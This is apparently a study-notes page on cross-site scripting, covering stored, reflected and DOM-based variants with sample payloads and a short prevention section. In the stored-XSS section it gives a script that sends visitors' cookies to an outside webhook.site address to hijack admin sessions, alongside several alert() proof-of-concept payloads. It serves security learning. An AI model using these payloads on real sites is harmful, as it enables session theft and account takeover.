# Cross Side Scripting

Cross-Site Scripting (XSS) is a type of security vulnerability commonly found in web applications. It occurs when an attacker injects malicious scripts into a web page, which is then executed by unsuspecting users. This allows the attacker to steal data, hijack user sessions, or perform various malicious actions on the victim's behalf.

### Type of Xss

- [verify XSS](#verify-xss)
- [XSS between HTML tags]
- [stored XSS](#stored-xss)
- [reflected XSS](#reflected-xss)
    - [find reflected XSS](#how-to-find-and-test-for-reflected-xss-vulnerabilities)
- [DOM-based XSS](#dom-based-xss)
    - [Common Sources](#common-sources)
    - [Sinks DOM-BASED vuln](#sinks-dom-based-vulnerabilities)
    - [innerHTML with onerror](#innerhtml-with-onerror)
    - [DOM XSS Jquery](#dom-xss-in-jquery)
            - [attr](#attr)
            - [selector function $()](#selector-func)
    - [Dom based Angular](#dom-xss-angularjs)
- [Prevent XSS attack](#prevent-xss)

## Verify XSS

```js
<script>alert(document.cookie)</script>
```

## XSS between HTML tags

When the XSS context is text between HTML tags, you need to introduce some new HTML tags designed to trigger execution of JavaScript.

Some useful ways of executing JavaScript are:

```html
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```

## Stored Xss

Stored Cross-Site Scripting (XSS) attacks, often referred to as "persistent XSS", are a type of web vulnerability where malicious scripts are injected and stored on a web application's server. These scripts are then served to other users who visit the affected web page.

- [steal cookie](#steal-cookie)

### Steal cookie

The idea is to infect the web page so that when a user logs in, we steal their cookies. If it's the admin, we can then take control of the website.

#### Exploit with webhook

goto [WebHook website](https://webhook.site/) to get a https to redirect users and see their cookies.

```js
<script>document.location='	https://webhook.site/...?c=' + document.cookie</script>
```

## Reflected XSS

Reflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.

Suppose a website has a search function which receives the user-supplied search term in a URL parameter:`https://insecure-website.com/search?term=gift`

The application echoes the supplied search term in the response to this URL:

```html
<p>You searched for: gift</p>
```

Assuming the application doesn't perform any other processing of the data, an attacker can construct an attack like this:

```html
https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>
```

This URL results in the following response:

```html
<p>You searched for: <script>/* Bad stuff here... */</script></p>
```

If another user of the application requests the attacker's URL, then the script supplied by the attacker will execute in the victim user's browser, in the context of their session with the application.

### How to find and test for reflected XSS vulnerabilities

- Test every entry point:This includes parameters or other data within the URL query string and message body, and the URL file path. It also includes HTTP headers.
- Submit random alphanumeric values.For each entry point, submit a unique random value and determine whether the value is reflected in the response.
- Determine the reflection context.  For each location within the response where the random value is reflected, determine its context. This might be in text between HTML tags, within a tag attribute which might be quoted, within a JavaScript string, etc.
- Test a candidate payload. Based on the context of the reflection, test an initial candidate XSS payload that will trigger JavaScript execution if it is reflected unmodified within the response.
- Test alternative payloads. If the candidate XSS payload was modified by the application, or blocked altogether, then you will need to test alternative payloads and techniques that might deliver a working XSS attack based on the context of the reflection and the type of input validation that is being performed.

## DOM-based XSS

DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as eval() or innerHTML. This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts.

### Common sources

The following are typical sources that can be used to exploit a variety of taint-flow vulnerabilities:

```js
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database
```

### Sinks DOM-based vulnerabilities

The following list provides a quick overview of common DOM-based vulnerabilities and an example of a sink that can lead to each one. For a more comprehensive list of relevant sinks:

vulnerability | js
--- | ---
DOM XSS | `document.write()`
[Open redirect] | `window.location`
[Cookie Manipulation] | `document.cookie`
[JS injection] | `eval()`
[Document domain manipulation] | `document.domain`
[WebSocket-URL poisoning] | `WebSocket()`
[LinK manipulation] | `element.src`
[Web message manipulation] | `postMessage()`
[Ajax request-header manipulation] | `setRequestHeader()`
[Local file-path manipulation] | `FileReader.readAsText()`
[Client-side SQL injection] | `ExecuteSql()`
[HTML5-storage manipulation] | `sessionStorage.setItem()`
[Client-side XPath injection] | `document.evaluate()`
[Client-side JSON injection] | `JSON.parse()`
[DOM-data manipulation] | `element.setAttribute()`
[Denial of service] | `RegExp()`

### innerHTML with onerror

```js
?search=<img src="1" onerror=alert(1)>
```

### DOM XSS in jQuery

If a JavaScript library such as jQuery is being used, look out for sinks that can alter DOM elements on the page.

#### attr

For instance, jQuery's attr() function can change the attributes of DOM elements. If data is read from a user-controlled source like the URL, then passed to the attr() function, then it may be possible to manipulate the value sent to cause XSS.

Ex:

```h
$(function() {
	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```

You can exploit this by modifying the URL so that the location.search source contains a malicious JavaScript URL. After the page's JavaScript applies this malicious URL to the back link's href, clicking on the back link will execute it:

```h
?returnUrl=javascript:alert(document.domain)
```

#### selector func $()

Another potential sink to look out for is jQuery's $() selector function, which can be used to inject malicious objects into the DOM.

jQuery used to be extremely popular, and a classic DOM XSS vulnerability was caused by websites using this selector in conjunction with the location.hash source for animations or auto-scrolling to a particular element on the page. This behavior was often implemented using a vulnerable hashchange event handler, similar to the following:

```h
$(window).on('hashchange', function() {
	var element = $(location.hash);
	element[0].scrollIntoView();
});
```

As the hash is user controllable, an attacker could use this to inject an XSS vector into the `$()` selector sink. More recent versions of jQuery have patched this particular vulnerability by preventing you from injecting HTML into a selector when the input begins with a hash character (#). However, you may still find vulnerable code in the wild.

To actually exploit this classic vulnerability, you'll need to find a way to trigger a hashchange event without user interaction. One of the simplest ways of doing this is to deliver your exploit via an iframe:

```html
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

In this example, the src attribute points to the vulnerable page with an empty hash value. When the iframe is loaded, an XSS vector is appended to the hash, causing the hashchange event to fire.

### DOM XSS AngularJS

In angular `{{ code... }}` is the way to execute js and make reference to variables declare in the controler.

If the expression `{{ 1 + 1}}` return 2, it mean you can inject some code.

Angular function have a property `constructor` which is a reference to `Function('function code in string')` method which allow you to create a function.

Example: `{{ $on }}` is a function same as `{{ $eval }}` so we can call:

```h
{{ $eval.constructor("alert(1)") }}
```

Nice we created a malicious function, but we need to call it:

```h
{{ $eval.constructor("alert(1)")() }}
```

Extra add of `()` at the end of the anonymous function we did created call it instantly.

## Prevent XSS

Preventing cross-site scripting is trivial in some cases but can be much harder depending on the complexity of the application and the ways it handles user-controllable data.

In general, effectively preventing XSS vulnerabilities is likely to involve a combination of the following measures:

Filter input on arrival. At the point where user input is received, filter as strictly as possible based on what is expected or valid input.

Encode data on output. At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.

Use appropriate response headers. To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the Content-Type and X-Content-Type-Options headers to ensure that browsers interpret the responses in the way you intend.
Content Security Policy. As a last line of defense, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.

### Documentation

- [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

---

[**:arrow_right_hook: Back home**](/README.md)
